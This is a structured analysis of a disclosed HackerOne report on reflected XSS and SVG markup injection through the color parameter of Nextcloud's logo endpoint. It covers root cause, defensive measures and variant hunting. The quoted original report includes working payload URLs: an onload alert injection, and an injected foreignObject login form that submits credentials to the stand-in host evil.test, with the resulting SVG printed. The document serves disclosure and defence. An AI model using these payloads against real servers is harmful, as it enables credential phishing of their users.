# Reflected XSS / Markup Injection in Nextcloud Logo Color Parameter

## Metadata
- **Source:** HackerOne
- **Report:** 605915 | https://hackerone.com/reports/605915
- **Submitted:** 2019-06-11
- **Reporter:** freddyb
- **Program:** Nextcloud
- **Bounty:** Not specified
- **Severity:** medium
- **Vuln:** Reflected Cross-Site Scripting (XSS), Markup Injection, SVG Injection
- **CVEs:** CVE-2020-8120
- **Category:** web-api

## Summary
A reflected XSS vulnerability exists in Nextcloud Server's SVG logo endpoint (index.php/svg/core/logo/logo) where the 'color' parameter is not properly sanitized before being inserted into SVG markup. While a Content-Security-Policy mitigates direct script execution, the lack of a form-action directive enables phishing attacks through injected HTML forms within SVG foreignObject elements.

## Attack scenario
1. Attacker crafts a malicious URL with SVG-breaking and foreignObject injection payload in the color parameter
2. Victim clicks the link or is redirected to the malicious URL via social engineering
3. The server reflects the unsanitized color parameter into SVG markup without escaping
4. Browser parses the injected SVG and renders the embedded HTML form via foreignObject element
5. Attacker's styling (via CSS injection or theme classes) makes the phishing form appear legitimate
6. Victim enters credentials which are exfiltrated to attacker-controlled endpoint (form action bypasses CSP due to missing form-action directive)

## Root cause
The color parameter in the logo endpoint is directly concatenated into SVG output without proper input validation or HTML entity encoding. The application assumes the parameter will only contain hex color values but does not enforce this, allowing attackers to break out of the fill attribute context and inject arbitrary SVG/HTML elements.

## Attacker mindset
An attacker recognizes that SVG is an XML-based format that can embed HTML via foreignObject elements. They understand that CSP blocks script execution but may not restrict form submissions, making phishing viable. The attacker leverages the trusted Nextcloud domain to increase victim credibility and combines SVG injection with social engineering.

## Defensive takeaways
- Implement strict input validation: whitelist only valid hex color formats (#[0-9a-fA-F]{6}) before use
- HTML-encode all user input before inserting into XML/SVG contexts (use entity encoding for quotes, slashes, angle brackets)
- Apply Content-Security-Policy with form-action 'none' or self to prevent unauthorized form submissions
- Use SVG-specific sanitization libraries rather than generic HTML sanitizers when outputting SVG
- Consider using a parameterized SVG template with separate data binding rather than string concatenation
- Implement X-Frame-Options and X-Content-Type-Options headers to prevent embedding attacks
- Add security headers like X-XSS-Protection for defense-in-depth

## Variant hunting
Check other SVG generation endpoints for similar parameter injection (other logo variants, icons, profile pictures)
Test image manipulation parameters (width, height, scale, viewBox) for similar issues
Review all endpoints that accept color or styling parameters that are reflected in HTML/SVG/CSS output
Hunt for foreignObject usage in SVG generation - can any parameter control nested HTML content?
Test for stored variants if color preferences are saved (stored XSS)
Examine theme customization endpoints that might accept SVG parameters
Check if CSP bypass techniques exist (data: URIs, event handlers in SVG animation elements)

## MITRE ATT&CK
- T1190
- T1598.003
- T1566.002

## Notes
This vulnerability is particularly interesting because it demonstrates CSP limitations - while CSP prevents inline script execution, it does not prevent phishing when form-action is not restricted. The use of SVG's foreignObject element to embed HTML shows attackers leveraging XML features to bypass input validation assumptions. The multi-circle SVG structure suggests this is a network diagram logo, and the injection repeats across multiple circle elements, maximizing phishing impact. The reporter responsibly noted the CSP mitigation exists but highlighted residual risk, showing good security analysis.

## Full report
<details><summary>Expand</summary>

I just found a reflected Cross-Site Scripting (XSS) vulnerability in Nextcloud Server that affects current stable and dates back to at least 15.0.5.
The vulnerability seems mitigated by a Content-Security-Policy (CSP), but there might be a residual risk for phishing, due to the CSP's lack of a `form-action` directive.

Steps to repeat (for basic XSS):
0) Replace server.test in the following URLs with your own test instance of Nextcloud.
1) Open Developer Tools (alternatively, disable CSP in your browser :-))
2) go to https://server.test/nextcloud/index.php/svg/core/logo/logo?color=f00%22/%3E%3Cg%20onload=%22javascript:alert(1)%22%3E%3C/g%3E%3Ccircle%20alt=%22meh
3) Observe the CSP violation (alternatively, the alert popup)

Steps to repeat for phishing
0) Replace server.test in the following URLS with your own test instance of Nextcloud.
1) Visit https://server.test/nextcloud/index.php/svg/core/logo/logo?color=fff%22/%3E%3CforeignObject%20class=%22node%22%20x=%220%22%20y=%220%22%20width=%22600%22%20height=%22600%22%3E%3Cdiv%20xmlns=%22http://www.w3.org/1999/xhtml%22%3E%3Cp%3ELogin%3C/p%3E%3Cform%20action=%22//evil.test%22%3E%3Cinput%20placeholder=%22Username%22%20type=%22text%22/%3E%3Cbr/%3E%20%3Cinput%20placeholder=%22Password%22%20type=%22text%22%20/%3E%3Cbr/%3E%3Cinput%20type=%22submit%22%20value=%22Login%22%20/%3E%3C/form%3E%3C/div%3E%3C/foreignObject%3E%3Ccircle%20alt=%22
1a) For improved readability, here's the resulting SVG source code
```html
<svg width="256" height="128" version="1.1" viewBox="0 0 256 128" xmlns="http://www.w3.org/2000/svg"><g fill="none" stroke-width="22"><circle cx="40" cy="64" r="26" stroke="#fff"/><foreignObject class="node" x="0" y="0" width="600" height="600"><div xmlns="http://www.w3.org/1999/xhtml"><p>Login</p><form action="//evil.test"><input placeholder="Username" type="text"/><br/> <input placeholder="Password" type="text" /><br/><input type="submit" value="Login" /></form></div></foreignObject><circle alt="" fill="none"/><circle cx="216" cy="64" r="26" stroke="#fff"/><foreignObject class="node" x="0" y="0" width="600" height="600"><div xmlns="http://www.w3.org/1999/xhtml"><p>Login</p><form action="//evil.test"><input placeholder="Username" type="text"/><br/> <input placeholder="Password" type="text" /><br/><input type="submit" value="Login" /></form></div></foreignObject><circle alt="" fill="none"/><circle cx="128" cy="64" r="46" stroke="#fff"/><foreignObject class="node" x="0" y="0" width="600" height="600"><div xmlns="http://www.w3.org/1999/xhtml"><p>Login</p><form action="//evil.test"><input placeholder="Username" type="text"/><br/> <input placeholder="Password" type="text" /><br/><input type="submit" value="Login" /></form></div></foreignObject><circle alt="" fill="none"/></g></svg>

```
2) Observe how we injected a login form that points to https://evil.test. Note that further styling using CSS files of the currently applied theme could be used to make the attack more convincing. Additionally, an attacker might put the Nextcloud instance into an iframe, to hide the injection from the address bar (depending on X-Frame-Options header).

## Impact

- Phishing
- XSS on the nextcloud instance, if the CSP is bypassed (rather unlikely)

</details>

---
*Analysed by Claude on 2026-05-12*
